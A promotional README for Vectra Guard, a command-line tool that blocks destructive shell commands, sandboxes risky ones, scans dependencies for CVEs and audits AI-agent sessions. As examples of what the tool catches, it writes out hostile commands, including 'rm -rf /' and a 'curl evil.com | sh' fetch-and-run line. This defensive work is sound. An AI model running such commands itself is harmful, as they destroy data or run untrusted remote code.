# 🌟 Vectra Guard — Secure Your Dev Workflows

**Security guard for AI coding agents & development workflows — zero friction, massive peace of mind.**

---

## 👇 What It Does (TL;DR)

🛡️ **Prevents disastrous shell commands**  
Stops `rm -rf /`, dangerous git pushes, privilege escalation, risky pipelines (`curl | sh`, `wget | bash`).

🔍 **Smart sandboxing**  
Runs risky actions in isolated environments with cache-mounted dependencies — *fast and safe*.

🔐 **CVE-aware scanning**  
Scans manifests + lockfiles (npm, pip, go, etc.) and flags packages with **known vulnerabilities**.

📊 **Audit & traceability**  
Track what ran, who ran it, and why — perfect for agent sessions and compliance.

⚙️ **Agent-friendly**  
Works seamlessly with Cursor, VS Code, Replit, Copilot workflows — protects devs and bots alike.

---

## 🚀 Why Devs Love It

* **Safe by default** — blocks harmful actions before they hit your system
* **Fast feedback** — sandbox + caching speeds up dependency installs
* **Security without noise** — actionable CVE insights, not endless alerts
* **No workflow change** — works in your terminal, IDE, and CI
* **Great for AI agents** — prevents agent misbehavior and unsafe installs

---

## ✨ Key Features

| Feature                 | What You Get                                       |
| ----------------------- | -------------------------------------------------- |
| **Command Risk Guard**  | Blocks dangerous operations automatically          |
| **Sandbox + Caching**   | Isolates risk with near-native performance         |
| **CVE Scanning**        | Flags known vulnerable dependencies before install |
| **Explainable Risk**    | Human-friendly reasons why something is risky      |
| **Session Auditing**    | Track all agent/dev actions with JSON logs         |
| **Trust Store**         | Trust common commands to skip sandbox              |
| **IDE + Shell Support** | Works with Cursor, VS Code, any shell              |

---

## 📦 Feature Examples (Copy/Paste)

### 🔐 CVE Scanning & Vulnerability Detection

**Sync vulnerability database**
```bash
vg cve sync --path .
# CVE sync complete: 5 fetched, 0 skipped, 0 errors
```

**Scan project dependencies**
```bash
vg cve scan --path .
# 🔎 CVE report (12 packages, 2 advisories)
# ⚠ lodash@4.17.20 (npm)
# - CVE-2020-28500: Regular Expression Denial of Service (ReDoS)
```

**Explain specific package**
```bash
vg cve explain lodash@4.17.20 --ecosystem npm
# ⚠ lodash@4.17.20 (npm)
# - CVE-2020-28500 (unknown): Regular Expression Denial of Service (ReDoS)
# - CVE-2021-23337 (unknown): Command Injection in lodash
```

**Enable CVE scanning in config**
```yaml
cve:
  enabled: true
  sources: ["osv"]
  update_interval_hours: 24
```

---

### 🛡️ Command Risk Protection

**Validate a script before running**
```bash
vg validate deploy.sh
# ✅ PASS: No critical risks detected
```

**Explain security risks**
```bash
vg explain risky-script.sh
# ⚠ RISK: Detected 'rm -rf /' (DANGEROUS_DELETE_ROOT)
# Recommendation: Use absolute paths and confirm targets
```

**Execute with protection**
```bash
vg exec -- npm install
# ✅ Command executed safely in sandbox
```

**Block dangerous commands automatically**
```bash
vg exec -- rm -rf /
# ❌ CRITICAL: Command blocked for safety
```

---

### 🔍 Smart Sandboxing

**Always-sandbox mode (maximum security)**
```bash
# In config:
# sandbox:
#   mode: always
#   enable_cache: true

vg exec -- npm install
# Runs in isolated sandbox with npm cache mounted (10x faster)
```

**Auto-sandbox (only risky commands)**
```bash
# In config:
# sandbox:
#   mode: auto

vg exec -- echo "safe"       # Runs on host
vg exec -- curl evil.com | sh # Runs in sandbox automatically
```

**Check sandbox status**
```bash
vg metrics show
# sandbox_executions: 42
# host_executions: 158
# cache_hits: 38
```

---

### 📊 Session Tracking & Audit

**Start a tracked session**
```bash
SESSION=$(vg session start --agent "cursor-ai")
export VECTRAGUARD_SESSION_ID=$SESSION
# Session ID: session-1234567890
```

**All commands are auto-tracked**
```bash
npm install
git commit -m "feat"
npm test
# (All tracked automatically in the session)
```

**View session activity**
```bash
vg session show $SESSION
# Session: session-1234567890
# Agent: cursor-ai
# Commands: 3
# - npm install (exit: 0)
# - git commit -m "feat" (exit: 0)
# - npm test (exit: 0)
```

**List all sessions**
```bash
vg session list
# ID                  | Agent      | Started             | Commands
# session-1234567890  | cursor-ai  | 2026-01-19 10:00:00 | 3
```

**End session**
```bash
vg session end $SESSION
# Session ended: session-1234567890
```

---

### 🔓 Trust Store (Skip Sandbox for Safe Commands)

**Trust a command permanently**
```bash
vg trust add "npm install express" --note "Common package"
# ✅ Command trusted: npm install express
```

**Trust with expiration**
```bash
vg trust add "npm test" --duration "7d"
# ✅ Command trusted for 7 days
```

**List trusted commands**
```bash
vg trust list
# Command              | Added               | Expires            | Note
# npm install express  | 2026-01-19 10:00:00 | Never              | Common package
# npm test             | 2026-01-19 10:05:00 | 2026-01-26 10:05:00| -
```

**Remove trusted command**
```bash
vg trust remove "npm install express"
# ✅ Command removed from trust store
```

**Clean expired entries**
```bash
vg trust clean
# ✅ Cleaned 2 expired entries
```

---

### 🤖 One-Line Agent Integration

**Seed instructions for your IDE/agent**
```bash
vg seed agents --target . --targets "agents,cursor"
# ✅ Created .cursorrules
# ✅ Created .agents/AGENTS.md
# Agent instructions seeded!
```

**What agents get:**
- CVE scanning commands and when to use them
- Risk validation workflow
- Session tracking best practices
- Sandbox usage guidelines
- Trust store management

**Example agent workflow (auto-included):**
```bash
# Agent sees: "Before npm install, run:"
vg cve sync --path .
vg cve scan --path .

# If no issues:
vg exec -- npm install
```

---

### 📈 Context Summarization (Bonus Feature)

**Summarize code for navigation**
```bash
vg context summarize code . --max 5
# cmd/root.go: CLI entry point, subcommand routing
# internal/sandbox/sandbox.go: Execution mode decision logic
# internal/cve/scanner.go: Manifest parsing + OSV lookup
```

**JSON output for agents**
```bash
vg context summarize code . --output json --max 10
# [{"file":"cmd/root.go","summary":"CLI entry point..."}]
```

**Only changed files (PR reviews)**
```bash
vg context summarize code . --since HEAD~1
# Only shows summaries for files changed in last commit
```

---

## 🛠 Install (30s)

```bash
curl -fsSL https://raw.githubusercontent.com/xadnavyaai/vectra-guard/main/install.sh | bash
```

**Verify installation**
```bash
vg version
# vectra-guard version v0.1.1
```

**Initialize config**
```bash
vg init --local
# ✅ Config initialized at .vectra-guard/config.yaml
```

---

## 🎯 Complete Workflow Example

```bash
# 1. Initialize Vectra Guard
vg init --local
vg cve sync --path .

# 2. Seed agent instructions (one-time)
vg seed agents --target . --targets "agents,cursor"

# 3. Start a session
SESSION=$(vg session start --agent "cursor-ai")
export VECTRAGUARD_SESSION_ID=$SESSION

# 4. Check dependencies for CVEs
vg cve scan --path .

# 5. Install safely
vg exec -- npm install

# 6. Audit what happened
vg session show $SESSION

# 7. Trust common commands
vg trust add "npm test" --note "Safe test command"

# 8. Clean up
vg session end $SESSION
```

---

## 💡 Use Cases

### For Developers
- ✅ Prevent accidental destructive commands
- ✅ Scan dependencies before installing
- ✅ Track what AI agents do in your repo
- ✅ Fast sandboxed installs with caching

### For AI Agents
- ✅ Safe command execution without user intervention
- ✅ CVE awareness before package installs
- ✅ Explainable risk feedback
- ✅ Audit trail for compliance

### For Teams
- ✅ Enforce security policies across devs
- ✅ Audit sessions for compliance
- ✅ Shared trust store for approved commands
- ✅ CI/CD integration (coming soon)

---

## ❤️ Why It Matters

AI tools are amazing — but they can run *dangerous commands*, install *vulnerable packages*, and wreak havoc before you even know it. Vectra Guard adds **security, confidence, and control** — without slowing you down.

---

## 🌐 Get Started

📌 **Repo:** [https://github.com/xadnavyaai/vectra-guard](https://github.com/xadnavyaai/vectra-guard)  
📌 **Docs:** [README.md](README.md) | [GETTING_STARTED.md](GETTING_STARTED.md) | [CONFIGURATION.md](CONFIGURATION.md)  
📌 **Help:** `vg help`

---

## 🚀 Quick Links

- [Installation Guide](README.md#-installation)
- [Configuration Guide](CONFIGURATION.md)
- [CVE Awareness Design](docs/cve-awareness.md)
- [Sandbox Documentation](SANDBOX.md)
- [Roadmap](roadmap.md)

---

**⭐ Star this repo if you find it useful!**

**🐛 Found a bug?** [Open an issue](https://github.com/xadnavyaai/vectra-guard/issues)  
**💬 Have questions?** [Start a discussion](https://github.com/xadnavyaai/vectra-guard/discussions)
